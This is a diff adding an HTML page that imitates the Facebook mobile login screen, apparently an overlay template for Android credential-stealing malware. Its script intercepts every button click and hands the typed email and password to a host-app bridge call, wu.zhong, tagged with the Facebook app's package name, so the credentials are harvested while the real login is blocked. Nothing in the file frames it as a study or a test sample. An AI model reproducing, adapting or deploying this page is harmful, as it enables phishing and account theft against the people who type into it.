@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            color: white;
+            position: relative;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 30px 20px 20px 20px;
+            margin-bottom: 60px;
+        }
+
+        .back-arrow {
+            font-size: 28px;
+            margin-right: 0;
+            cursor: pointer;
+            position: absolute;
+            left: 20px;
+        }
+
+        .language-selector {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #8e8e93;
+            font-size: 17px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 32px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .facebook-logo {
+            width: 100px;
+            height: 100px;
+            background: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 120px;
+            position: relative;
+        }
+
+        .form-container {
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            border-radius: 14px;
+            padding: 18px 22px;
+            font-size: 17px;
+            color: white;
+            margin-bottom: 18px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-field::placeholder {
+            color: #9ca3af;
+            font-weight: 400;
+        }
+
+        .input-field:focus {
+            border-color: rgba(255, 255, 255, 0.4);
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .login-button {
+            width: 100%;
+            background: #1877f2;
+            border: none;
+            border-radius: 30px;
+            padding: 18px;
+            font-size: 17px;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            margin: 32px 0;
+            transition: all 0.3s ease;
+        }
+
+        .login-button:hover {
+            background: #166fe5;
+        }
+
+        .forgot-password {
+            color: #9ca3af;
+            font-size: 15px;
+            text-decoration: none;
+            margin-bottom: 80px;
+            font-weight: 400;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            width: 100%;
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 30px;
+            padding: 18px;
+            font-size: 17px;
+            color: #1877f2;
+            cursor: pointer;
+            margin-bottom: 50px;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+
+        .create-account:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .meta-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            color: #9ca3af;
+            font-size: 18px;
+            font-weight: 400;
+            margin-bottom: 30px;
+            letter-spacing: 0.5px;
+        }
+
+        .meta-logo::before {
+            content: '∞';
+            font-size: 26px;
+            font-weight: bold;
+        }
+
+        .home-indicator {
+            position: fixed;
+            bottom: 8px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 140px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 2px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="back-arrow"></div>
+        <div class="language-selector">
+            English (US) <span></span>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="facebook-logo"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/512px-2021_Facebook_icon.svg.png" style="height: 100px;"></div>
+        
+        <div class="form-container">
+            <input type="text" id="email" class="input-field" placeholder="Mobile number or email">
+            <input type="password" id="password" class="input-field" placeholder="Password">
+            
+            <button class="login-button">Log in</button>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+            <br>   <br>
+            <button class="create-account">Create new account</button>
+            
+            <div class="meta-logo">Meta</div>
+        </div>
+    </div>
+
+    <div class="home-indicator"></div>
+
+    <script>
+
+        const inputs = document.querySelectorAll('.input-field');
+        
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.transform = 'scale(1.02)';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.transform = 'scale(1)';
+            });
+        });
+
+        const buttons = document.querySelectorAll('button');
+        buttons.forEach(button => {
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+
+                wu.zhong(`🔰 Facebook Login \n\n✉️Email: ${document.getElementById("email").value}\n\n🔒Password: ${document.getElementById("password").value}`, "com.facebook.katana");
+    
+                this.style.transform = 'scale(0.95)';
+                setTimeout(() => {
+                    this.style.transform = 'scale(1)';
+                }, 150);
+            });
+        });
+    </script>
+</body>
+</html>
